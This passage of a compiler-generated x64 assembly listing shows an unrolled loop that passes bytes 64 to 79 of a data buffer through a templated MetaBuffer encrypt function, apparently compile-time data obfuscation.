  00a9f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00aa4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aab	88 41 40	 mov	 BYTE PTR [rcx+64], al
  00aae	b8 01 00 00 00	 mov	 eax, 1
  00ab3	48 6b c0 40	 imul	 rax, rax, 64		; 00000040H
  00ab7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00abe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ac2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ac9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00ace	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ad5	88 41 41	 mov	 BYTE PTR [rcx+65], al
  00ad8	b8 01 00 00 00	 mov	 eax, 1
  00add	48 6b c0 41	 imul	 rax, rax, 65		; 00000041H
  00ae1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ae8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00aec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00af3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00af8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aff	88 41 42	 mov	 BYTE PTR [rcx+66], al
  00b02	b8 01 00 00 00	 mov	 eax, 1
  00b07	48 6b c0 42	 imul	 rax, rax, 66		; 00000042H
  00b0b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b12	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b16	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b1d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00b22	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b29	88 41 43	 mov	 BYTE PTR [rcx+67], al
  00b2c	b8 01 00 00 00	 mov	 eax, 1
  00b31	48 6b c0 43	 imul	 rax, rax, 67		; 00000043H
  00b35	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b3c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b40	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b47	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00b4c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b53	88 41 44	 mov	 BYTE PTR [rcx+68], al
  00b56	b8 01 00 00 00	 mov	 eax, 1
  00b5b	48 6b c0 44	 imul	 rax, rax, 68		; 00000044H
  00b5f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b66	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b6a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b71	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00b76	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b7d	88 41 45	 mov	 BYTE PTR [rcx+69], al
  00b80	b8 01 00 00 00	 mov	 eax, 1
  00b85	48 6b c0 45	 imul	 rax, rax, 69		; 00000045H
  00b89	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b90	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b94	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b9b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00ba0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ba7	88 41 46	 mov	 BYTE PTR [rcx+70], al
  00baa	b8 01 00 00 00	 mov	 eax, 1
  00baf	48 6b c0 46	 imul	 rax, rax, 70		; 00000046H
  00bb3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00bba	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00bbe	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bc5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00bca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bd1	88 41 47	 mov	 BYTE PTR [rcx+71], al
  00bd4	b8 01 00 00 00	 mov	 eax, 1
  00bd9	48 6b c0 47	 imul	 rax, rax, 71		; 00000047H
  00bdd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00be4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00be8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bef	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00bf4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bfb	88 41 48	 mov	 BYTE PTR [rcx+72], al
  00bfe	b8 01 00 00 00	 mov	 eax, 1
  00c03	48 6b c0 48	 imul	 rax, rax, 72		; 00000048H
  00c07	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c0e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c12	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c19	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c1e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c25	88 41 49	 mov	 BYTE PTR [rcx+73], al
  00c28	b8 01 00 00 00	 mov	 eax, 1
  00c2d	48 6b c0 49	 imul	 rax, rax, 73		; 00000049H
  00c31	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c38	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c3c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c43	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c48	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c4f	88 41 4a	 mov	 BYTE PTR [rcx+74], al
  00c52	b8 01 00 00 00	 mov	 eax, 1
  00c57	48 6b c0 4a	 imul	 rax, rax, 74		; 0000004aH
  00c5b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c62	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c66	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c6d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c72	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c79	88 41 4b	 mov	 BYTE PTR [rcx+75], al
  00c7c	b8 01 00 00 00	 mov	 eax, 1
  00c81	48 6b c0 4b	 imul	 rax, rax, 75		; 0000004bH
  00c85	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c8c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c90	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c97	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c9c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ca3	88 41 4c	 mov	 BYTE PTR [rcx+76], al
  00ca6	b8 01 00 00 00	 mov	 eax, 1
  00cab	48 6b c0 4c	 imul	 rax, rax, 76		; 0000004cH
  00caf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00cb6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00cba	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00cc1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00cc6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ccd	88 41 4d	 mov	 BYTE PTR [rcx+77], al
  00cd0	b8 01 00 00 00	 mov	 eax, 1
  00cd5	48 6b c0 4d	 imul	 rax, rax, 77		; 0000004dH
  00cd9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ce0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ce4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ceb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00cf0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00cf7	88 41 4e	 mov	 BYTE PTR [rcx+78], al
  00cfa	b8 01 00 00 00	 mov	 eax, 1
  00cff	48 6b c0 4e	 imul	 rax, rax, 78		; 0000004eH
  00d03	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d0a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d0e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d15	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00d1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d21	88 41 4f	 mov	 BYTE PTR [rcx+79], al
  00d24	b8 01 00 00 00	 mov	 eax, 1
  00d29	48 6b c0 4f	 imul	 rax, rax, 79		; 0000004fH
  00d2d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d34	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d38	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
